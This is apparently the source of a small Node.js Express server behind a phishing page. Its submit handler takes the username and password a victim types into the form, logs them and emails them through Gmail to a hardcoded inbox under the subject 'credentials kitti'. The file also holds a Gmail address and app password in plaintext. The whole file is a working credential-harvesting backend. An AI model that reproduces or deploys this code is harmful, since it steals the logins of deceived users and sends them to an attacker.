import express from "express"
import bodyparser from "body-parser"
import nodemailer from "nodemailer"



const app=express();
const port=3000;

app.use(bodyparser.urlencoded({extended:true}));

app.get("/",(req,res)=>{
    res.render("index.ejs");
})

app.post("/submit",(req,res)=>{
    var username=req.body["usn"];
    var password=req.body["pswd"];

    console.log(username);
    console.log(password);

    res.render("index.ejs");
    

    const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "karthiksecond96@gmail.com",          // acc details aan sukshikanam
      pass: "iutn hehx bydq isoo"             
    }
   });


 const mailOptions = {
    from: "karthiksecond96@gmail.com",  // sender (user’s email from form)
    to: "karthiksecond96@gmail.com", // your inbox
    subject: "credentials kitti",
    text: `username: ${username} \n password: ${password}`
  };







  // ✅ Send the email
  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error("Error sending email:", err);
      res.send(" Error sending email.");
    } else {
      console.log(" Email sent:", info.response);
      
    }
  });

  

   
})

app.listen(process.env.PORT||port,()=>{
    console.log("server is live on port "+port);
})